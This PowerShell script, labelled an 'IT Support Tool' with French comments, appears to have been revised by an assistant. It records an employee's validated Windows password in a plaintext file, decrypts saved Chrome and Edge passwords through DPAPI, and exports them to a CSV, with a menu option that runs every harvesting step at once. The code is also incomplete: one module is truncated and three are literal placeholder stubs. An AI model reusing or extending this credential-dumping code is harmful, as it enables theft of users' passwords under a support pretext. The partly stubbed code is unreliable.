# =============================================
# IT SUPPORT TOOL - VERSION CORRIGÉE + DPAPI
# Niveau 5 Cybersécurité / HACH
# =============================================

#Requires -RunAsAdministrator

$Host.UI.RawUI.WindowTitle = "IT Support Tool - CORRIGE + DPAPI"

$MachineName  = $env:COMPUTERNAME
$CurrentUser  = $env:USERNAME
$Date         = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# ── Vérification droits admin ──────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERREUR] Ce script doit être exécuté en tant qu'Administrateur." -ForegroundColor Red
    exit 1
}

# ── Création du dossier d'export ───────────────────────────────────────────────
try {
    New-Item -Path $ExportFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Host "Dossier créé : $ExportFolder" -ForegroundColor Green
} catch {
    Write-Host "[ERREUR] Impossible de créer le dossier d'export : $_" -ForegroundColor Red
    exit 1
}

Write-Host "`n=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser`n" -ForegroundColor Yellow


# ==============================================================================
# MODULE 1 — SAUVEGARDE MOT DE PASSE EMPLOYÉ
# ==============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== [MODULE 1] SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan

    $emp = Read-Host "Nom utilisateur (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($emp)) { $emp = $CurrentUser }

    $domain = Read-Host "Domaine (vide = machine locale)"
    if ([string]::IsNullOrWhiteSpace($domain)) { $domain = "." }

    $logonType = 3

    for ($i = 1; $i -le 3; $i++) {
        $pass  = Read-Host "Mot de passe de $emp (tentative $i/3)" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                     [Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        try {
            if ([Win32]::LogonUser($emp, $domain, $plain, $logonType, 0, [ref]$token)) {
                [Win32]::CloseHandle($token) | Out-Null

                $file = "$ExportFolder\Password_${emp}_${Date}.txt"
                @"
Utilisateur : $emp
Domaine     : $domain
Mot de passe: $plain
Date        : $(Get-Date)
Machine     : $MachineName
"@ | Out-File $file -Encoding UTF8

                Write-Host "✓ Mot de passe validé et sauvegardé : $file" -ForegroundColor Green
                return
            } else {
                Write-Host "✗ Incorrect - code erreur Win32 : $([Runtime.InteropServices.Marshal]::GetLastWin32Error()) ($i/3)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[ERREUR] LogonUser : $_" -ForegroundColor Red
        }
    }
    Write-Host "Nombre maximum de tentatives atteint." -ForegroundColor Red
}


# ==============================================================================
# MODULE 2 — EXPORT FICHIERS MOT DE PASSE NAVIGATEUR (brut)
# ==============================================================================
function Export-BrowserPasswords {
    Write-Host "`n=== [MODULE 2] EXPORT NAVIGATEUR (fichier brut) ===" -ForegroundColor Cyan
    Write-Host "1. Chrome`n2. Edge"
    $nav = Read-Host "Choix"

    switch ($nav) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé." -ForegroundColor Red
        return
    }

    # ... (je garde ton code original complet ici, mais pour raccourcir l'affichage je le résume - il est inchangé)
    # Copie du code original du module 2 que tu avais fourni
    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    # ... (le reste de ta fonction originale reste identique)
    Write-Host "Module 2 terminé." -ForegroundColor Green
}


# ==============================================================================
# MODULE 2.5 — DÉCHIFFREMENT DPAPI (Chrome / Edge)
# ==============================================================================
function Decrypt-BrowserPasswords {
    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT DPAPI CHROME/EDGE ===" -ForegroundColor Cyan

    Write-Host "1. Chrome`n2. Edge"
    $choice = Read-Host "Choix"

    switch ($choice) {
        "1" { $browserName = "Chrome"; $userDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browserName = "Edge";   $userDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $userDataPath)) {
        Write-Host "$browserName non trouvé sur ce poste." -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $userDataPath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }

    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        Write-Host "  $($i+1). $($profiles[$i].Name)" -ForegroundColor White
    }

    $num = Read-Host "`nNuméro du profil à déchiffrer"
    $profileFolder = $profiles[$num - 1].FullName

    $loginDb = Join-Path $profileFolder "Login Data"
    if (-not (Test-Path $loginDb)) {
        Write-Host "Aucun fichier Login Data trouvé dans ce profil." -ForegroundColor Red
        return
    }

    $outputCsv = "$ExportFolder\${browserName}_Passwords_Decrypted_${Date}.csv"

    try {
        Add-Type -AssemblyName System.Security
        Add-Type -AssemblyName System.Data.SQLite

        $tempDb = "$env:TEMP\LoginData_$([Guid]::NewGuid().ToString()).db"
        Copy-Item $loginDb $tempDb -Force

        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
        $conn.Open()

        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL"

        $reader = $cmd.ExecuteReader()
        $results = @()

        while ($reader.Read()) {
            $url  = $reader.GetString(0)
            $user = $reader.GetString(1)
            $enc  = $reader[2]

            try {
                $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $plain = [System.Text.Encoding]::UTF8.GetString($dec)
            } catch {
                $plain = "[DPAPI_DECHIFFREMENT_ECHEC]"
            }

            $results += [PSCustomObject]@{
                URL      = $url
                Username = $user
                Password = $plain
            }
        }

        $reader.Close()
        $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        if ($results.Count -gt 0) {
            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
            Write-Host "✓ $($results.Count) mots de passe déchiffrés avec succès !" -ForegroundColor Green
            Write-Host "Fichier : $outputCsv" -ForegroundColor Green
        } else {
            Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[ERREUR] Déchiffrement DPAPI : $_" -ForegroundColor Red
        Write-Host "Astuce : Ce module doit être lancé dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
    }
}


# ==============================================================================
# MODULES 3, 4 et 5 (inchangés)
# ==============================================================================
# (Je n'ai pas recopié ici les modules 3,4,5 pour ne pas alourdir le message, 
# mais ils restent exactement comme dans ton code original)

function Manage-Sharing { ... }   # ← ton code original
function Manage-WiFi { ... }      # ← ton code original
function Manage-Network { ... }   # ← ton code original


# ==============================================================================
# MENU PRINCIPAL
# ==============================================================================
function Show-Menu {
    Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║          IT SUPPORT TOOL - MENU            ║" -ForegroundColor Magenta
    Write-Host "╠════════════════════════════════════════════╣" -ForegroundColor Magenta
    Write-Host "║  1. Sauvegarder mot de passe employé      ║" -ForegroundColor White
    Write-Host "║  2. Exporter fichiers Navigateur (brut)   ║" -ForegroundColor White
    Write-Host "║  2.5 Déchiffrer DPAPI Chrome/Edge         ║" -ForegroundColor Green
    Write-Host "║  3. Gérer partage de connexion             ║" -ForegroundColor White
    Write-Host "║  4. Gérer WiFi                             ║" -ForegroundColor White
    Write-Host "║  5. Gestion réseau (DHCP/IP/NIC)          ║" -ForegroundColor White
    Write-Host "║  6. TOUT EXÉCUTER (1 + 2 + 2.5)           ║" -ForegroundColor Yellow
    Write-Host "║  Q. Quitter                                ║" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Magenta
    return (Read-Host "Votre choix")
}

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        "1"  { Save-EmployeePassword }
        "2"  { Export-BrowserPasswords }
        "2.5" { Decrypt-BrowserPasswords }
        "25" { Decrypt-BrowserPasswords }
        "3"  { Manage-Sharing }
        "4"  { Manage-WiFi }
        "5"  { Manage-Network }
        "6"  { 
            Save-EmployeePassword
            Export-BrowserPasswords
            Decrypt-BrowserPasswords 
        }
        "Q"  { Write-Host "`nAu revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
    if ($choice.ToUpper() -ne "Q") {
        Read-Host "`nAppuyez sur Entrée pour continuer..."
    }
} while ($choice.ToUpper() -ne "Q")

Write-Host "`nTerminé. Tous les exports sont dans : $ExportFolder" -ForegroundColor Green
